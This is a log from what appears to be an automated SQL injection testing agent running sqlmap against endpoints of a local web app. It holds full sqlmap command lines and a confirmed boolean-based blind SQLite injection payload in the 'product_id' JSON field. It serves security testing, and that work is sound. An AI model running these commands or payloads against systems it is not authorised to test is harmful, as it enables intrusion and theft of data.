2025-09-26 19:03:01,699 - INFO - 
2025-09-26 19:03:01,699 - INFO - [*] starting @ 19:03:01 /2025-09-26/
2025-09-26 19:03:01,699 - INFO - 
2025-09-26 19:03:03,568 - INFO - [19:03:03] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
2025-09-26 19:03:04,086 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:03:04,086 - INFO - [19:03:04] [INFO] testing connection to the target URL
2025-09-26 19:03:04,262 - INFO - [19:03:04] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:03:04,343 - INFO - [19:03:04] [INFO] testing if the target URL content is stable
2025-09-26 19:03:04,677 - INFO - [19:03:04] [INFO] target URL content is stable
2025-09-26 19:03:04,679 - INFO - [19:03:04] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
2025-09-26 19:03:06,289 - INFO - [19:03:06] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
2025-09-26 19:03:06,310 - INFO - [19:03:06] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
2025-09-26 19:03:06,329 - INFO - [19:03:06] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
2025-09-26 19:03:06,381 - INFO - [19:03:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:03:06,436 - INFO - [19:03:06] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:03:08,695 - INFO - [19:03:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:03:09,797 - INFO - [19:03:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:03:10,899 - INFO - [19:03:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:03:11,680 - INFO - [19:03:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:03:12,195 - INFO - [19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:03:12,410 - INFO - [19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:03:12,638 - INFO - [19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:03:12,889 - INFO - [19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:03:13,406 - INFO - [19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:03:13,837 - INFO - [19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:03:14,271 - INFO - [19:03:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:03:15,038 - INFO - [19:03:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:03:15,677 - INFO - [19:03:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:03:16,427 - INFO - [19:03:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:03:17,286 - INFO - [19:03:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:03:18,350 - INFO - [19:03:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:03:19,169 - INFO - [19:03:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:03:19,966 - INFO - [19:03:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:03:20,767 - INFO - [19:03:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:03:21,607 - INFO - [19:03:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:03:22,440 - INFO - [19:03:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:03:23,322 - INFO - [19:03:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:03:24,042 - INFO - [19:03:24] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:03:24,917 - INFO - [19:03:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:03:25,243 - INFO - [19:03:25] [INFO] (custom) POST parameter 'JSON product_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
2025-09-26 19:03:25,243 - INFO - it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:03:25,253 - INFO - [19:03:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:03:25,253 - INFO - [19:03:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:03:25,455 - INFO - [19:03:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:03:25,675 - INFO - [19:03:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:03:25,860 - INFO - [19:03:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:03:26,029 - INFO - [19:03:26] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:03:26,256 - INFO - [19:03:26] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:03:26,472 - INFO - [19:03:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:03:26,636 - INFO - [19:03:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:03:26,873 - INFO - [19:03:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:03:27,065 - INFO - [19:03:27] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:03:27,240 - INFO - [19:03:27] [INFO] checking if the injection point on (custom) POST parameter 'JSON product_id' is a false positive
2025-09-26 19:03:28,459 - INFO - (custom) POST parameter 'JSON product_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 19:03:28,516 - INFO - sqlmap identified the following injection point(s) with a total of 1825 HTTP(s) requests:
2025-09-26 19:03:28,516 - INFO - ---
2025-09-26 19:03:28,516 - INFO - Parameter: JSON product_id ((custom) POST)
2025-09-26 19:03:28,516 - INFO -     Type: boolean-based blind
2025-09-26 19:03:28,516 - INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
2025-09-26 19:03:28,516 - INFO -     Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
2025-09-26 19:03:28,516 - INFO - ---
2025-09-26 19:03:28,524 - INFO - [19:03:28] [INFO] the back-end DBMS is SQLite
2025-09-26 19:03:28,528 - INFO - back-end DBMS: SQLite
2025-09-26 19:03:28,528 - INFO - [19:03:28] [WARNING] HTTP error codes detected during run:
2025-09-26 19:03:28,528 - INFO - 500 (Internal Server Error) - 1803 times
2025-09-26 19:03:28,528 - INFO - [19:03:28] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'
2025-09-26 19:03:28,528 - INFO - 
2025-09-26 19:03:28,528 - INFO - [*] ending @ 19:03:28 /2025-09-26/
2025-09-26 19:03:28,528 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:01 /2025-09-26/

[19:03:03] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:03:04] [INFO] testing connection to the target URL
[19:03:04] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:03:04] [INFO] testing if the target URL content is stable
[19:03:04] [INFO] target URL content is stable
[19:03:04] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
[19:03:06] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
[19:03:06] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
[19:03:06] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
[19:03:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:03:06] [WARNING] reflective value(s) found and filtering out
[19:03:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:03:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:03:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:03:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:03:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:03:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:03:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:03:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:03:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:03:24] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:03:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:03:25] [INFO] (custom) POST parameter 'JSON product_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:03:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:03:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:03:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:03:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:03:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:03:26] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:03:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:03:27] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:03:27] [INFO] checking if the injection point on (custom) POST parameter 'JSON product_id' is a false positive
(custom) POST parameter 'JSON product_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1825 HTTP(s) requests:
---
Parameter: JSON product_id ((custom) POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
---
[19:03:28] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:03:28] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1803 times
[19:03:28] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'

[*] ending @ 19:03:28 /2025-09-26/

2025-09-26 19:03:28,717 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Add_a_review_for_a_product_discovery.log
2025-09-26 19:03:28,717 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --dbs
2025-09-26 19:03:32,089 - INFO -         ___
2025-09-26 19:03:32,089 - INFO -        __H__
2025-09-26 19:03:32,089 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:03:32,089 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 19:03:32,089 - INFO - |___|_  [)]_|_|_|__,|  _|
2025-09-26 19:03:32,089 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:03:32,089 - INFO - 
2025-09-26 19:03:32,116 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:03:32,116 - INFO - 
2025-09-26 19:03:32,116 - INFO - [*] starting @ 19:03:32 /2025-09-26/
2025-09-26 19:03:32,131 - INFO - 
2025-09-26 19:03:33,955 - INFO - [19:03:33] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
2025-09-26 19:03:34,487 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:03:34,497 - INFO - [19:03:34] [INFO] resuming back-end DBMS 'sqlite'
2025-09-26 19:03:34,507 - INFO - [19:03:34] [INFO] testing connection to the target URL
2025-09-26 19:03:34,792 - INFO - sqlmap resumed the following injection point(s) from stored session:
2025-09-26 19:03:34,792 - INFO - ---
2025-09-26 19:03:34,792 - INFO - Parameter: JSON product_id ((custom) POST)
2025-09-26 19:03:34,792 - INFO -     Type: boolean-based blind
2025-09-26 19:03:34,792 - INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
2025-09-26 19:03:34,792 - INFO -     Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
2025-09-26 19:03:34,792 - INFO - ---
2025-09-26 19:03:34,792 - INFO - [19:03:34] [INFO] the back-end DBMS is SQLite
2025-09-26 19:03:34,792 - INFO - back-end DBMS: SQLite
2025-09-26 19:03:34,792 - INFO - [19:03:34] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
2025-09-26 19:03:34,792 - INFO - [19:03:34] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'
2025-09-26 19:03:34,792 - INFO - 
2025-09-26 19:03:34,802 - INFO - [*] ending @ 19:03:34 /2025-09-26/
2025-09-26 19:03:34,802 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:32 /2025-09-26/

[19:03:33] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:03:34] [INFO] resuming back-end DBMS 'sqlite' 
[19:03:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON product_id ((custom) POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
---
[19:03:34] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:03:34] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[19:03:34] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'

[*] ending @ 19:03:34 /2025-09-26/

2025-09-26 19:03:34,974 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Add_a_review_for_a_product_dbs.log
2025-09-26 19:03:34,974 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews/test
2025-09-26 19:03:38,498 - INFO -         ___
2025-09-26 19:03:38,498 - INFO -        __H__
2025-09-26 19:03:38,498 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:03:38,498 - INFO - |_ -| . [.]     | .'| . |
2025-09-26 19:03:38,498 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 19:03:38,498 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:03:38,498 - INFO - 
2025-09-26 19:03:38,514 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:03:38,514 - INFO - 
2025-09-26 19:03:38,514 - INFO - [*] starting @ 19:03:38 /2025-09-26/
2025-09-26 19:03:38,514 - INFO - 
2025-09-26 19:03:40,835 - INFO - [19:03:40] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:03:40,836 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:03:40,837 - INFO - [19:03:40] [INFO] flushing session file
2025-09-26 19:03:40,847 - INFO - [19:03:40] [INFO] testing connection to the target URL
2025-09-26 19:03:40,909 - INFO - [19:03:40] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:03:40,912 - INFO - [19:03:40] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:03:40,922 - INFO - [19:03:40] [INFO] testing if the target URL content is stable
2025-09-26 19:03:41,369 - INFO - [19:03:41] [INFO] target URL content is stable
2025-09-26 19:03:41,369 - INFO - [19:03:41] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:03:41,419 - INFO - [19:03:41] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:03:41,434 - INFO - [19:03:41] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:03:41,463 - INFO - [19:03:41] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:03:41,514 - INFO - [19:03:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:03:41,620 - INFO - [19:03:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:03:41,652 - INFO - [19:03:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:03:41,717 - INFO - [19:03:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:03:41,768 - INFO - [19:03:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:03:41,824 - INFO - [19:03:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:03:41,884 - INFO - [19:03:41] [INFO] testing 'Generic inline queries'
2025-09-26 19:03:41,901 - INFO - [19:03:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:03:41,937 - INFO - [19:03:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:03:42,010 - INFO - [19:03:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:03:42,058 - INFO - [19:03:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:03:42,099 - INFO - [19:03:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:03:42,150 - INFO - [19:03:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:03:42,213 - INFO - [19:03:42] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:03:42,292 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:03:42,292 - INFO - [19:03:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:03:42,358 - INFO - [19:03:42] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:03:42,417 - INFO - [19:03:42] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:03:42,417 - INFO - [19:03:42] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:03:42,430 - INFO - [19:03:42] [WARNING] HTTP error codes detected during run:
2025-09-26 19:03:42,430 - INFO - 500 (Internal Server Error) - 77 times
2025-09-26 19:03:42,430 - INFO - 
2025-09-26 19:03:42,430 - INFO - [*] ending @ 19:03:42 /2025-09-26/
2025-09-26 19:03:42,430 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews/test
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:38 /2025-09-26/

[19:03:40] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:03:40] [INFO] flushing session file
[19:03:40] [INFO] testing connection to the target URL
[19:03:40] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:03:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:03:40] [INFO] testing if the target URL content is stable
[19:03:41] [INFO] target URL content is stable
[19:03:41] [INFO] testing if URI parameter '#1*' is dynamic
[19:03:41] [INFO] URI parameter '#1*' appears to be dynamic
[19:03:41] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:03:41] [INFO] testing for SQL injection on URI parameter '#1*'
[19:03:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:03:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:03:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:03:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:03:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:03:41] [INFO] testing 'Generic inline queries'
[19:03:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:03:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:03:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:03:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:03:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:03:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:03:42] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:03:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:03:42] [WARNING] reflective value(s) found and filtering out
[19:03:42] [WARNING] URI parameter '#1*' does not seem to be injectable
[19:03:42] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:03:42] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 77 times

[*] ending @ 19:03:42 /2025-09-26/

2025-09-26 19:03:42,577 - INFO - Flushed sqlmap session for http://localhost:5000/reviews/test (log: attack-logs-dynamic\Get_reviews_for_a_product_flush.log)
2025-09-26 19:03:42,578 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 19:03:45,920 - INFO -         ___
2025-09-26 19:03:45,920 - INFO -        __H__
2025-09-26 19:03:45,920 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:03:45,921 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 19:03:45,921 - INFO - |___|_  ["]_|_|_|__,|  _|
